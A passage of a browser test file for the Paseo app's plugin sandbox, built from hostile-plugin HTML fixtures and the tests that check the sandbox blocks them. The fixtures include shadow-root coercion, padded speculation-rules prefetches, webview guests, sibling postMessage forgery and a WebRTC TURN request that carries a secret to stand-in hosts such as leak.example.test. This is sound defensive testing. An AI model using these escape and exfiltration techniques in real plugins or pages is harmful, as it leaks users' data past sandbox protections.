 * `isPaseoBrowserWebviewAttach` (`features/browser-webviews/index.ts:43`)
 * accepts any `http:`/`https:` URL and only requires
 * `partition="persist:paseo-browser"`, a constant a plugin author reads out of
 * the published source.
 *
 * A browser test cannot attach a guest — in plain Chromium `<webview>` is an
 * unknown element and makes no request — so what this asserts is the half that
 * lives in `bridge.ts`: the element must not survive to the live document, from
 * markup or from script. It does today, `src` and `partition` intact.
 */
/**
 * Round 14. The `attachShadow` wrapper only forces `mode: "open"` when it reads
 * back the *primitive* string `"open"` or `"closed"`; anything else is "the
 * platform's to reject" and is forwarded untouched. `mode` is an enum, so the
 * platform converts it with `ToString` — `new String("closed")` (or any object
 * with a `toString`) is not `=== "closed"` for the wrapper and is a perfectly
 * valid `"closed"` for the platform.
 *
 * The wrapper's own verification then fires (`element.shadowRoot` is `null` for
 * a closed root, so it drops the host and throws) — but the root already exists,
 * and it was made by `attachShadow`, which sets "available to element internals".
 * `attachInternals().shadowRoot` hands it straight back. Re-append the host and
 * a frame inside that root is invisible to everything: the observer on
 * `document` is not told about mutations inside a shadow tree, `querySelectorAll`
 * does not cross the boundary, and `follow()` reads `null`.
 */
const SHADOW_MODE_COERCION_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var RAW_CHILD = "<script>var ice='no';try{var pc=new RTCPeerConnection(" +
        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
        "{exfil:1,type:'child',tag:'TAG',rtc:typeof RTCPeerConnection,ice:ice},'*');<\\/script>";

      try {
        customElements.define("x-coerce", class extends HTMLElement {});
        customElements.define("x-coerce2", class extends HTMLElement {});
      } catch (error) {}

      // Two shapes of a non-primitive \`mode\`: a boxed string and a plain object
      // with \`toString\`. Both are \`typeof "object"\`, so neither is \`=== "closed"\`.
      function attempt(tag, name, mode, notes) {
        var host = document.createElement(name);
        document.body.appendChild(host);
        try {
          host.attachShadow({ mode: mode });
          notes.push(tag + ":attachShadow=returned");
        } catch (error) {
          notes.push(tag + ":attachShadow:threw:" + (error && error.name));
        }
        notes.push(tag + ":shadowRoot=" + (host.shadowRoot ? host.shadowRoot.mode : "null"));
        var root = null;
        try {
          root = host.attachInternals().shadowRoot;
        } catch (error) {
          notes.push(tag + ":internals:threw:" + (error && error.name));
        }
        notes.push(tag + ":internalsRoot=" + (root ? root.mode : "null"));
        if (!root) return;
        // The wrapper's fail-closed path removed the host from the document.
        // Putting it back is one line, and the root comes with it.
        if (!host.isConnected) document.body.appendChild(host);
        try {
          var frame = document.createElement("iframe");
          frame.srcdoc = RAW_CHILD.replace("TAG", tag);
          root.appendChild(frame);
        } catch (error) {
          notes.push(tag + ":plant:threw:" + (error && error.name));
        }
      }

      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        var notes = [];
        try {
          attempt("boxed", "x-coerce", new String("closed"), notes);
        } catch (error) {
          notes.push("boxed:threw:" + (error && error.name));
        }
        try {
          attempt("tostring", "x-coerce2", { toString: function () { return "closed"; } }, notes);
        } catch (error) {
          notes.push("tostring:threw:" + (error && error.name));
        }

        setTimeout(function () {
          window.parent.postMessage(
            { exfil: 1, type: "swept", note: notes.join(" | ") },
            "*"
          );
        }, 600);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Round 14. `<script type="speculationrules">` names URLs the platform fetches
 * on its own, so both paths drop it — the detached sanitiser by an exact,
 * trimmed comparison, and the sweep by a CSS attribute selector.
 *
 * The platform strips leading and trailing ASCII whitespace off `type` before it
 * decides, and CSS has no way to do that. `[type="speculationrules" i]` is an
 * exact match, so a script appended at runtime with a padded `type` is acted on
 * by the platform and invisible to the sweep. Both orderings are here: markup,
 * which the trimming sanitiser already handled, and script, which did not.
 */
const SPECULATION_RULES_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script type=" speculationrules ">
      {"prefetch":[{"source":"list","urls":["https://markup.leak.example.test/?d=__exfil__"]}]}
    </script>
    <script>
      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try {
          var rules = document.createElement("script");
          rules.setAttribute("type", "\\n speculationrules\\t");
          rules.textContent = JSON.stringify({
            prefetch: [{ source: "list", urls: ["https://script.leak.example.test/?d=__exfil__"] }]
          });
          document.body.appendChild(rules);
        } catch (error) {}

        // Round 15. The sweep runs when a node is inserted and never again, and
        // this is the one entry in \`SELECTOR\` decided by an attribute rather
        // than a tag name. Appended as data it is swept, kept, and retyped a
        // tick later — after which nothing looks at it again.
        try {
          var later = document.createElement("script");
          later.setAttribute("type", "application/json");
          later.textContent = JSON.stringify({
            prefetch: [{ source: "list", urls: ["https://mutated.leak.example.test/?d=__exfil__"] }]
          });
          document.body.appendChild(later);
          setTimeout(function () { later.setAttribute("type", "speculationrules"); }, 50);
        } catch (error) {}

        setTimeout(function () {
          var found = [];
          var all = document.querySelectorAll("script");
          for (var i = 0; i < all.length; i++) {
            var type = all[i].getAttribute("type");
            if (type && type.trim().toLowerCase() === "speculationrules") found.push(type);
          }
          window.parent.postMessage({ exfil: 1, type: "rules", found: found }, "*");
        }, 300);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

const WEBVIEW_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <webview partition="persist:paseo-browser" src="https://markup.leak.example.test/?d=__exfil__"></webview>
    <script>
      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;

        try {
          var guest = document.createElement("webview");
          guest.setAttribute("partition", "persist:paseo-browser");
          guest.setAttribute("src", "https://script.leak.example.test/?d=__exfil__");
          document.body.appendChild(guest);
        } catch (error) {}

        setTimeout(function () {
          var found = [];
          var all = document.querySelectorAll("webview");
          for (var i = 0; i < all.length; i++) found.push(all[i].getAttribute("src"));
          window.parent.postMessage({ exfil: 1, type: "webviews", found: found }, "*");
        }, 300);
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * Two plugins are open at once the moment a user has both a preview and a
 * sidebar panel, and they are sibling frames in one document. `frames`,
 * `length`, indexed access and `postMessage` are all on the cross-origin
 * property allowlist, so `parent[i].postMessage(...)` reaches every other plugin
 * on the page. The host cannot intercept that — the message never passes through
 * it — so the only thing that separates a host message from a sibling's forgery
 * is `event.source`.
 *
 * The victim here is a plugin written the way docs/plugins.md tells you to write
 * one. It records what it accepted and what it turned away.
 */
const SIBLING_VICTIM_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var accepted = [];
      var rejected = [];
      window.addEventListener("message", function (event) {
        var data = event.data;
        if (!data || data.paseo !== 1) return;
        var note = data.type + ":" + (data.context && data.context.content);
        // The whole finding, in one comparison. On web the host is the app
        // document and on native it is the relay document, and both of them are
        // this frame's parent; a sibling plugin is never its parent.
        if (event.source === window.parent) accepted.push(note);
        else rejected.push(note);
        window.parent.postMessage(
          { exfil: 1, type: "victim", accepted: accepted, rejected: rejected },
          "*",
        );
      });
      window.parent.postMessage({ exfil: 1, type: "victim-ready" }, "*");
    </script>
  </body>
</html>`;

const SIBLING_ATTACKER_HTML = `<!doctype html>
<html>
  <body>
    <script>
      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
        var out = { reached: 0, nav: "navigated" };
        try {
          for (var i = 0; i < window.parent.length; i++) {
            try {
              window.parent[i].postMessage(
                {
                  paseo: 1,
                  type: "update",
                  context: { kind: "file-preview", path: "budget.csv", content: "FORGED" },
                  theme: {}
                },
                "*"
              );
              out.reached++;
            } catch (error) {}
          }
        } catch (error) {}
        // Navigating a sibling would be worse than lying to it: no
        // \`allow-same-origin\`, so the sandbox refuses.
        try { window.parent[0].location = "https://sibling.leak.example.test/"; }
        catch (error) { out.nav = "denied"; }
        window.parent.postMessage({ exfil: 1, type: "attacker", out: out }, "*");
      });
      window.parent.postMessage({ exfil: 1, type: "attacker-ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * `document.open()` is reachable on purpose — see the note above the `write`
 * denials in `bridge.ts`. It wipes the tree, and with it the CSP `<meta>` that
 * put the policy there in the first place, so "the parser is starved" is only
 * half of what has to survive it: the policy container does too, or one call
 * hands the plugin back `fetch` and `img`.
 */
const DOCUMENT_OPEN_ATTACK_HTML = `<!doctype html>
<html>
  <body>
    <script>
      window.addEventListener("message", function (event) {
        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
        var out = {};
        try { document.open(); out.open = "ok"; } catch (error) { out.open = "threw"; }
        out.metas = document.querySelectorAll("meta").length;
        try { document.write("x"); out.write = "ran"; } catch (error) { out.write = "threw"; }
        try { document.writeln("x"); out.writeln = "ran"; } catch (error) { out.writeln = "threw"; }
        out.rtc = typeof RTCPeerConnection;
        var img = new Image();
        img.onload = function () { finish("loaded"); };
        img.onerror = function () { finish("blocked"); };
        img.src = event.data.imageUrl;
        function finish(result) {
          out.img = result;
          fetch(event.data.base + "/after").then(
            function () { out.fetch = "sent"; },
            function () { out.fetch = "blocked"; }
          ).then(function () {
            window.parent.postMessage({ exfil: 1, type: "wiped", out: out }, "*");
          });
        }
      });
      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
    </script>
  </body>
</html>`;

/**
 * `event.source === window.parent` is only the whole answer if `postMessage` is
 * the only channel between two plugin frames, and if a worker is not a way to
 * get the fresh realm every other route is denied.
 *
 * Two frames, each a plugin. The pair report what a sibling can construct, what
 * it can reach, and what actually arrives.
 *
 * What this pins, all measured rather than reasoned:
 *
 * - `new Worker` and `new SharedWorker` are a fresh realm with no neuter script
 *   in it. `worker-src` is not written in the policy at all — it falls back to
 *   `default-src 'none'`, and that fallback is the only thing denying them.
 *   Adding `blob:` to `script-src` for a bundler would not obviously touch
 *   workers, and would.
 * - `BroadcastChannel` *constructs* in both frames. It is not denied, it is
 *   partitioned: two sandboxed frames get two different opaque origins, so the
 *   message is never delivered. A single `allow-same-origin` collapses that.
 * - The rest of the shared-state surface (`localStorage`, `sessionStorage`,
 *   `indexedDB`, `caches`, `document.cookie`, `navigator.serviceWorker`) throws
 *   `SecurityError`, and so does every attempt to find a sibling by name or to
 *   set its `opener`.
 * - A plugin can append its own CSP `<meta>`, and a policy delivered that way
 *   has its `report-uri`/`report-to` ignored — otherwise a violation report is
 *   an outbound POST that `connect-src` does not gate.
 */
const CHANNEL_VICTIM_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var log = [];
      try {
        var bc = new BroadcastChannel("paseo");
        bc.onmessage = function (e) { log.push("bc-arrived:" + e.data); };
        log.push("bc-constructed");
      } catch (e) { log.push("bc-threw:" + e.name); }
      try { window.name = "paseo-victim"; log.push("named"); } catch (e) {}
      window.addEventListener("message", function (e) {
        if (!e.data || e.data.exfil !== 1 || e.data.type !== "collect") return;
        window.parent.postMessage({ exfil: 1, type: "victim-log", log: log }, "*");
      });
      window.parent.postMessage({ exfil: 1, type: "victim-ready" }, "*");
    </script>
  </body>
</html>`;

const CHANNEL_ATTACKER_HTML = `<!doctype html>
<html>
  <body>
    <script>
      var out = {};
      var vio = [];
      var reports = [];
      document.addEventListener("securitypolicyviolation", function (e) {
        vio.push(e.effectiveDirective || e.violatedDirective);
      });
      function t(name, fn) {
        try { out[name] = String(fn()); } catch (e) { out[name] = "threw:" + (e.name || e); }
      }
      window.addEventListener("message", function (ev) {
        if (!ev.data || ev.data.exfil !== 1 || ev.data.type !== "attack") return;
        var IMG = ev.data.imageUrl;
        // A fresh realm reports from inside itself, for the same reason every
        // other child in this file does: the parent's view is decided by the
        // opaque origin, not by what the child got.
        var SRC = "self.postMessage('alive:' + typeof RTCPeerConnection + ':' + typeof fetch);";
        t("dataWorker", function () {
          new Worker("data:text/javascript," + encodeURIComponent(SRC)).onmessage =
            function (e) { out.workerSaid = String(e.data); };
          return "constructed";
        });
        t("blobWorker", function () {
          var u = URL.createObjectURL(new Blob([SRC], { type: "text/javascript" }));
          new Worker(u).onmessage = function (e) { out.workerSaid = String(e.data); };
          return "constructed";
        });
        t("sharedWorker", function () { new SharedWorker("data:text/javascript,0"); return "constructed"; });

        t("bcPost", function () { new BroadcastChannel("paseo").postMessage("FORGED"); return "sent"; });
        t("localStorage", function () { localStorage.setItem("a", "1"); return "ok"; });
        t("sessionStorage", function () { sessionStorage.setItem("a", "1"); return "ok"; });
        t("indexedDB", function () { indexedDB.open("a"); return "ok"; });
        t("caches", function () { return typeof caches; });
        t("cookie", function () { document.cookie = "a=1"; return "ok"; });
        t("serviceWorker", function () { return typeof navigator.serviceWorker; });
        t("openNamed", function () {
          return window.open("about:blank", "paseo-victim") === null ? "null" : "WINDOW";
        });
        t("siblingName", function () { return window.parent[0].name; });
        t("namedLookup", function () { return typeof window.parent["paseo-victim"]; });
        t("framesNamed", function () { return typeof window.parent.frames["paseo-victim"]; });
        t("setOpener", function () { window.parent[0].opener = window; return "ok"; });

        // The reporting endpoint a plugin would install for itself.
        t("reportingObserver", function () {
          new ReportingObserver(function (list) {
            var rs = list.getReports();
            for (var i = 0; i < rs.length; i++) reports.push(rs[i].type);
          }, { types: ["csp-violation"], buffered: true }).observe();
          var m = document.createElement("meta");
          m.httpEquiv = "Content-Security-Policy";
          m.content = "img-src 'none'; report-uri " + ev.data.base + "/r; report-to plug";
          document.head.appendChild(m);
          var i2 = new Image();
          i2.src = IMG;
          document.body.appendChild(i2);
          return "installed";
        });

        setTimeout(function () {
          out.violations = vio.join(",");
          out.reports = reports.join(",") || "none";
          window.parent.postMessage({ exfil: 1, type: "attacker-out", out: out }, "*");
        }, 1200);
      });
      window.parent.postMessage({ exfil: 1, type: "attacker-ready" }, "*");
    </script>
  </body>
</html>`;

interface Outcomes {
  windowOpen: string;
  fetch: string;
  img: string;
  rtc: string;
  rtcConstruct: string;
  rtcViaFrame: string;
  violations: string[];
}

function loadImage(url: string): Promise<boolean> {
  return new Promise((resolve) => {
    const img = new Image();
    img.addEventListener("load", () => resolve(true));
    img.addEventListener("error", () => resolve(false));
    img.src = url;
  });
}

const cleanups: Array<() => void> = [];

afterEach(() => {
  while (cleanups.length > 0) {
    cleanups.pop()?.();
  }
});

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitFor<T>(read: () => T | null, what: string): Promise<T> {
  const deadline = Date.now() + 5000;
  for (;;) {
    const value = read();
    if (value !== null) {
      return value;
    }
    if (Date.now() > deadline) {
      throw new Error(`Timed out waiting for ${what}`);
    }
    await sleep(10);
  }
}

beforeAll(() => {
  // Chromium applies a CSP meta inserted after load, so the test document runs
  // under the same policy the app ships.
  const meta = document.createElement("meta");
  meta.httpEquiv = "Content-Security-Policy";
  meta.content = hostContentSecurityPolicy();
  document.head.appendChild(meta);
});

describe("a hostile plugin", () => {
  it("cannot get a single request out, including by navigating its own frame", async () => {
    expect(hostContentSecurityPolicy()).toContain("frame-src 'none'");

    // Same-origin, so anything that is not refused genuinely reaches a server.
    // "https://evil.tld" would fail DNS and prove nothing.
    const base = `${location.origin}/${EXFIL_MARKER}`;
    const secret = "s3cr3t-file-content";
    const imageUrl = `${location.origin}/pwa-icon-192.png?${EXFIL_MARKER}=${secret}`;

    // The control: this exact URL loads from the host document, so the plugin
    // failing to load it is the sandbox refusing the request, not a dead URL.
    expect(await loadImage(imageUrl)).toBe(true);

    const hostViolations: string[] = [];
    const onHostViolation = (event: SecurityPolicyViolationEvent) => {
      hostViolations.push(
        `${event.effectiveDirective || event.violatedDirective} ${event.blockedURI}`,
      );
    };
    document.addEventListener("securitypolicyviolation", onHostViolation);

    let loads = 0;
    let report: Outcomes | null = null;
    // Anything the child manages to say, from its own realm. Note the source
    // check below deliberately excludes it, so it needs its own listener.
    const childReports: unknown[] = [];
    const onChildReport = (event: MessageEvent) => {
      if (event.data?.exfil === 1 && event.data.type === "child") {
        childReports.push(event.data);
      }
    };
    window.addEventListener("message", onChildReport);
    cleanups.push(() => window.removeEventListener("message", onChildReport));
    const iframe = createPluginIframe(HOSTILE_PLUGIN_HTML);
    iframe.addEventListener("load", () => {
      loads += 1;
    });
    const onMessage = (event: MessageEvent) => {
      if (event.source !== iframe.contentWindow || event.data?.exfil !== 1) {
        return;
      }
      if (event.data.type === "ready") {
        iframe.contentWindow?.postMessage(
          { exfil: 1, type: "attack", base, imageUrl, rtcHost: new URL(base).host },
          "*",
        );
      }
      if (event.data.type === "report") {
        report = event.data.outcomes as Outcomes;
      }
    };
    window.addEventListener("message", onMessage);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      document.removeEventListener("securitypolicyviolation", onHostViolation);
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const outcomes = await waitFor<Outcomes>(() => report, "the hostile plugin's report");

    // srcdoc is exempt from frame-src, so the plugin still runs at all.
    expect(loads).toBe(1);
    expect(outcomes.fetch).toBe("blocked");
    expect(outcomes.windowOpen).toBe("blocked");
    expect(outcomes.img).toBe("blocked");
    // The form POST needs no CSP violation to be stopped: the frame has no
    // `allow-forms`, so it never becomes a request — the load count above is
    // what proves the frame did not submit anywhere.
    expect(outcomes.violations).toEqual(
      expect.arrayContaining(["connect-src", "img-src", "frame-src"]),
    );

    // No CSP directive can express this one, so the shell deletes the
    // constructors outright and a fresh realm must not return them.
    expect(outcomes.rtc).toBe("absent");
    expect(outcomes.rtcConstruct).toBe("threw");

    // The deletion only covers the realm it ran in, so the plugin must not get
    // a second realm. The child never becomes a browsing context: it is removed
    // as it is inserted, so its script never parses and it never reports.
    expect(outcomes.rtcViaFrame).toBe("removed");
    expect(childReports).toEqual([]);

    // Now the vector the guest's own policy cannot stop.
    iframe.contentWindow?.postMessage({ exfil: 1, type: "navigate", base, secret }, "*");
    await sleep(500);

    // The parent's `frame-src` is the only thing that can report this, and that
    // is the point: the guest's own policy never sees its own navigation.
    // Chromium blocks it, drops the frame to an empty document (hence the
    // second load), and never sends the request.
    expect(hostViolations.join("\n")).toContain(`frame-src ${base}/navigate`);
    expect(loads).toBe(2);

    // The frame no longer answers, so the host's `update` messages go to a
    // blank opaque document rather than to the attacker's page.
    let answered = false;
    const onPong = (event: MessageEvent) => {
      if (event.source === iframe.contentWindow) {
        answered = true;
      }
    };
    window.addEventListener("message", onPong);
    cleanups.push(() => window.removeEventListener("message", onPong));
    iframe.contentWindow?.postMessage({ exfil: 1, type: "ping" }, "*");
    await sleep(200);
    expect(answered).toBe(false);
  });

  it("cannot get a child realm by attacking the remover itself", async () => {
    const childReports: Array<{ tag: string; rtc: string }> = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      if (event.data?.exfil !== 1) {
        return;
      }
      if (event.data.type === "child") {
        childReports.push({ tag: event.data.tag, rtc: event.data.rtc });
      }
      if (event.data.type === "swept") {
        swept = true;
      }
      if (event.data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(REMOVER_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the remover attack to finish");

    // Any report at all means a child realm reached script execution, and every
    // such realm hands back a `RTCPeerConnection` the shell never touched.
    expect(childReports).toEqual([]);
  });

  it("cannot get a child realm by hiding the frame in a shadow root", async () => {
    const childReports: string[] = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = true;
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the shadow attack to finish");

    expect(childReports).toEqual([]);
  });

  it("cannot get a closed shadow root out of the HTML parser", async () => {
    const childReports: string[] = [];
    let denied: string[] | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        denied?: string[];
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        denied = data.denied ?? [];
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(DECLARATIVE_SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => denied, "the declarative shadow attack to finish");

    expect(childReports).toEqual([]);
    // Denying the API is the mitigation; if any of these starts succeeding
    // again, the `<template shadowrootmode="closed">` inside it comes back with
    // it and nothing downstream can see the frame.
    expect(denied).toEqual(["write", "setHTMLUnsafe", "parseHTMLUnsafe"]);
  });

  it("cannot get a child realm by disarming the observer itself", async () => {
    const childReports: string[] = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = true;
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(OBSERVER_POISON_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the observer-poison attack to finish");

    expect(childReports).toEqual([]);
  });

  it("cannot get a child realm by poisoning what the observer reads", async () => {
    const childReports: string[] = [];
    let swept = false;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; tag?: string; ice?: string };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = true;
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(OBSERVER_INIT_POISON_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    await waitFor(() => (swept ? true : null), "the observer-init poison attack to finish");

    // Joined so the failure names the tags and says whether the child's WebRTC
    // actually started gathering, rather than printing `[ …(2) ]`.
    expect(childReports.join(" ")).toBe("");
  });

  it("cannot get a child realm by owning the shell's own Object.create", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(BARE_POISON_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the bare() poison attack to finish");

    // The wrapper's whole job is to force `mode: "open"`; if this says "closed"
    // the plugin already owns the argument, whatever the frame report says.
    expect(childReports.join(" ")).toBe("");
    // The wrapper exists to force `mode: "open"`; "closed" means the plugin owns
    // the argument even when no frame report happens to arrive.
    expect(note).toBe("open");
  });

  it("cannot get a closed shadow root out of DOMParser", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(DOMPARSER_SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the DOMParser shadow attack to finish");

    // Named in the message so a failure says which ordering got through and
    // whether the child's WebRTC actually started gathering.
    expect(`${childReports.join(" ")} | ${note}`).toBe(
      " | adopt:kids=1;shadow=none import:kids=1;shadow=none",
    );
  });

  it("cannot get a closed shadow root out of XSLTProcessor", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        rtc?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=rtc:${data.rtc};ice:${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(XSLT_SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the XSLT shadow attack to finish");

    // Nothing may report from inside a child realm: that report is the escape.
    // The note rides in the failure message so a red run says how far the attack
    // got — whether the parse honoured declarative shadow DOM, and whether the
    // host reached the live document.
    //
    // Asserted as absence rather than as one expected note, because there is more
    // than one way to be safe here and the fix picked a different one than this
    // test first assumed: `transformToDocument` and `transformToFragment` are
    // denied outright, so the transform throws before there is a host to adopt.
    expect(childReports, note).toEqual([]);
    expect(note).toContain("hostConnected=0");
  });

  it("cannot get a closed shadow root out of the Sanitizer API", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        rtc?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=rtc:${data.rtc};ice:${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(SANITIZER_SHADOW_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the Sanitizer shadow attack to finish");

    // Nothing may report from inside a child realm: that report is the escape.
    // The note rides in the failure message so a red run says which entry point
    // honoured declarative shadow DOM and how far the host got.
    expect(childReports, note).toEqual([]);
    // Denied outright rather than surviving the sanitiser's own filtering: the
    // default config happens to strip the frame today, and that is the
    // sanitiser's policy to change, not ours.
    expect(note).toContain("setHTMLWide:threw:");
  });

  it("cannot get a closed shadow root by coercing attachShadow's mode", async () => {
    const childReports: string[] = [];
    let swept: string | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as {
        exfil?: number;
        type?: string;
        tag?: string;
        ice?: string;
        rtc?: string;
        note?: string;
      };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "child") {
        childReports.push(`${data.tag}=rtc:${data.rtc};ice:${data.ice}`);
      }
      if (data.type === "swept") {
        swept = data.note ?? "";
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(SHADOW_MODE_COERCION_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

    const note = await waitFor(() => swept, "the shadow-mode coercion attack to finish");

    // A report from a child realm is the escape.
    expect(childReports, note).toEqual([]);
    // And no closed root may exist at all, retrievable or not: `attachShadow`
    // is the only door left to one, and a closed root that merely fails to be
    // *retrieved* today is one `ElementInternals` change from the same hole.
    // Both readings say `open`, which is the wrapper doing its single job.
    expect(note).toContain("boxed:shadowRoot=open");
    expect(note).toContain("boxed:internalsRoot=open");
    expect(note).toContain("tostring:shadowRoot=open");
    expect(note).toContain("tostring:internalsRoot=open");
  });

  it("cannot leave a speculation-rules script in the document", async () => {
    let found: string[] | null = null;
    const onMessage = (event: MessageEvent) => {
      const data = event.data as { exfil?: number; type?: string; found?: string[] };
      if (data?.exfil !== 1) {
        return;
      }
      if (data.type === "rules") {
        found = data.found ?? [];
      }
      if (data.type === "ready") {
        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
      }
    };
    window.addEventListener("message", onMessage);

    const iframe = createPluginIframe(SPECULATION_RULES_ATTACK_HTML);
    document.body.appendChild(iframe);
    cleanups.push(() => {
      window.removeEventListener("message", onMessage);
      iframe.remove();
    });

